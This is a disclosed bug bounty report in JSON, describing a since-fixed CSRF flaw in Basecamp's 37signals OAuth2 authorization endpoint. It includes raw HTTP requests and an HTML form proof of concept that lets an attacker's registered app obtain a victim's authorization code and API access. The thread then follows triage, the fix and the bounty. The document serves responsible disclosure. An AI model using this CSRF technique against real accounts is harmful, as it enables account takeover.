{"id":850022,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTAwMjI=","url":"https://hackerone.com/reports/850022","title":"CSRF on launchpad.37signals.com OAuth2 authorization endpoint","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-04-14T23:22:27.499Z","submitted_at":"2020-04-14T23:22:27.499Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"carbon61","url":"/carbon61","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":67,"url":"https://hackerone.com/basecamp","handle":"basecamp","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Basecamp","twitter_handle":"basecamp","website":"https://basecamp.com/about/policies/security/response","about":"Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Creators of the HEY email service."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-10-30T18:35:11.408Z","bug_reporter_agreed_on_going_public_at":"2020-10-30T18:35:11.330Z","team_member_agreed_on_going_public_at":"2020-10-29T20:44:58.337Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\nI found a CSRF in the OAuth2 authorization endpoint on launchpad.37signals.com. That allows a malicious 3rd party application to gain full API access to  victim's  account in 37signals products  that uses OAuth2 authorization.\n\nI found that when making a post request to ``` authorization ```  endpoint it does not check the \"authenticity token\" if you add \" .json or .xml \" like this \"authorization.json\" .\n\n##post request:\n```\nPOST /authorization.json HTTP/1.1\nHost: launchpad.37signals.com\nConnection: close\nContent-Length: 168\nCache-Control: max-age=0\nOrigin: null\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36\nSec-Fetch-Dest: document\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: _beanstalk_uuid=\n\nclient_id={your-client-id}\u0026type=web_server\u0026redirect_uri={your-redirect-uri}\u0026commit=\n\n```\n\n\nAfter a 3rd party application gets the authorization code from redirect_uri, it can then exchange it for an access token. and get full access to the api.\n\n## request to get the access token:\n\n```\nPOST /authorization/token HTTP/1.1\nHost: launchpad.37signals.com\nConnection: close\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36\nSec-Fetch-Dest: document\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: _beanstalk_uuid=\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 214\n\ntype=web_server\u0026client_id={your-client-id}\u0026redirect_uri={your-redirect-uri}\u0026client_secret={your-client-secret}\u0026code={authorization-code}\n\n```\n\n## PoC:\n\n1- you will need to register on the 37Signals Integration Portal.\n\n2- Login to any 37Signals apps that uses the OAuth2 authorization for example basecamp 3 account. (i tested it using basecamp 3 )\n\n3- for testing , submit the following form through the browser in which you are logged in:\n\n```\n\u003cform action=\"https://launchpad.37signals.com/authorization.json\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"client\u0026#95;id\" value=\"{your-client-id}\" /\u003e\n      \u003cinput type=\"hidden\" name=\"client\u0026#95;secret\" value=\"\" /\u003e\n      \u003cinput type=\"hidden\" name=\"type\" value=\"web\u0026#95;server\" /\u003e\n      \u003cinput type=\"hidden\" name=\"redirect\u0026#95;uri\" value=\"{your-redirect-uri}\" /\u003e\n      \u003cinput type=\"hidden\" name=\"commit\" value=\"\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n```\n\nyou will get the {authorization-code} so you can exchange it for an access token\n\n## Note that a real attack does not require user interaction.\n\n## Impact\n\nThrough this vulnerability an attacker can do malicious actions on the victim's account\nfull API access to  victim's  account","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-11-28T20:44:58.431Z","allow_singular_disclosure_after":-27370160.38211293,"singular_disclosure_allowed":true,"vote_count":31,"voters":["fqdn","ivodafon","ali","capdegarde_","sudi","0nlymohammed","moex","3x3s","h4x0r_dz","akashhamal0x01","and 21 more..."],"severity":{"rating":"high","score":8.1,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"none"}},"structured_scope":{"databaseId":4656,"asset_type":"URL","asset_identifier":"launchpad.37signals.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":7666122,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Thanks for investigating \u0026 reporting, @carbon61.\n\nThis is an error, but uncertain to what extent it's a vulnerabilityâ€”or exploitable.\n\n\u003e After a 3rd party application gets the authorization code from redirect_uri\n\nAre you suggesting that the redirect_uri is hijacked to another URL?","automated_response":false,"created_at":"2020-04-15T03:11:59.315Z","updated_at":"2020-04-15T03:11:59.315Z","actor":{"username":"jeremy","cleared":false,"url":"/jeremy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/121/d8d8bc5a99a5229118f3f1064beb83458d1d10d6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7677078,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"i meant the attacker could create a fake client app on \"https://launchpad.37signals.com/integrations/\" with his own redirect_uri and use it in the csrf ","automated_response":false,"created_at":"2020-04-15T21:26:45.738Z","updated_at":"2020-04-15T21:26:45.738Z","actor":{"username":"carbon61","cleared":false,"url":"/carbon61","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7677093,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"i will check it again and try to generate another Poc if you could not  reproduce it ","automated_response":false,"created_at":"2020-04-15T21:29:47.216Z","updated_at":"2020-04-15T21:29:47.216Z","actor":{"username":"carbon61","cleared":false,"url":"/carbon61","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7677346,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"i'm sorry maybe i reported this one too fast  , i will investigate more and let you know","automated_response":false,"created_at":"2020-04-15T22:18:48.706Z","updated_at":"2020-04-15T22:18:48.706Z","actor":{"username":"carbon61","cleared":false,"url":"/carbon61","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7677492,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"i just tested it with  different accounts in basecamphq.com and 3.basecamp.com and i can get the authorization code from my redirect_uri using the csrf form and i was able to exchange it for an access token\n","automated_response":false,"created_at":"2020-04-15T22:54:03.097Z","updated_at":"2020-04-15T22:54:03.097Z","actor":{"username":"carbon61","cleared":false,"url":"/carbon61","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7677856,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-04-16T00:01:34.463Z","updated_at":"2020-04-16T00:01:34.463Z","additional_data":{"old_severity":"High","new_severity":"High (8.1)","old_severity_id":692405,"new_severity_id":693528},"actor":{"username":"jeremy","cleared":false,"url":"/jeremy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/121/d8d8bc5a99a5229118f3f1064beb83458d1d10d6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7678639,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"\u003e i can get the authorization code from my redirect_uri using the csrf form and i was able to exchange it for an access token\n\nAh, indeed. Confirming CSRF against the authorization page, allowing an attacker to gain access to an account.\n\nWe'll put together a fix and verify with you shortly. Thanks @carbon61.","automated_response":false,"created_at":"2020-04-16T03:47:47.289Z","updated_at":"2020-04-16T03:47:47.289Z","actor":{"username":"jeremy","cleared":false,"url":"/jeremy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/121/d8d8bc5a99a5229118f3f1064beb83458d1d10d6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7700917,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"OK thanks .\n","automated_response":false,"created_at":"2020-04-17T20:24:24.664Z","updated_at":"2020-04-17T20:24:24.664Z","actor":{"username":"carbon61","cleared":false,"url":"/carbon61","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7730484,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"any updates about the bounty ?","automated_response":false,"created_at":"2020-04-20T21:08:41.941Z","updated_at":"2020-04-20T21:08:41.941Z","actor":{"username":"carbon61","cleared":false,"url":"/carbon61","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7734035,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @carbon61, sorry for the delay! We'll award a bounty later today, still discussing the amount between the team. We'll be also deploying a fix shortly. \n\nThank you again, this was another great find. ","automated_response":false,"created_at":"2020-04-21T07:32:29.257Z","updated_at":"2020-04-21T07:32:29.257Z","actor":{"username":"rosa","cleared":false,"url":"/rosa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/154/237/a07aeeba083a8f178942d326a68f6427c699e0f1_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7742186,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2020-04-21T15:48:43.985Z","updated_at":"2020-04-21T15:48:43.985Z","actor":{"url":"/basecamp","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Basecamp"}},"bounty_amount":"2000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"basecamp","collaborator":{"username":"carbon61","url":"/carbon61"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7742199,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi again @carbon61! We've just sent a bounty and also deployed a fix for this issue. Would you mind verifying whether you can still reproduce it? \n\nThank you!","automated_response":false,"created_at":"2020-04-21T15:49:35.814Z","updated_at":"2020-04-21T15:49:35.814Z","actor":{"username":"rosa","cleared":false,"url":"/rosa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/154/237/a07aeeba083a8f178942d326a68f6427c699e0f1_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7753775,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"the fix looks good, and thank you very much for the bounty.","automated_response":false,"created_at":"2020-04-22T12:11:38.914Z","updated_at":"2020-04-22T12:11:38.914Z","actor":{"username":"carbon61","cleared":false,"url":"/carbon61","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7753973,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for confirming!","automated_response":false,"created_at":"2020-04-22T12:26:00.141Z","updated_at":"2020-04-22T12:26:00.141Z","actor":{"username":"rosa","cleared":false,"url":"/rosa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/154/237/a07aeeba083a8f178942d326a68f6427c699e0f1_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"carbon61","url":"/carbon61"},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9675175,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-10-29T20:44:58.363Z","updated_at":"2020-10-29T20:44:58.363Z","first_to_agree":true,"actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9686803,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-10-30T18:35:11.362Z","updated_at":"2020-10-30T18:35:11.362Z","actor":{"username":"carbon61","cleared":false,"url":"/carbon61","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9686804,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-10-30T18:35:11.447Z","updated_at":"2020-10-30T18:35:11.447Z","actor":{"username":"carbon61","cleared":false,"url":"/carbon61","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}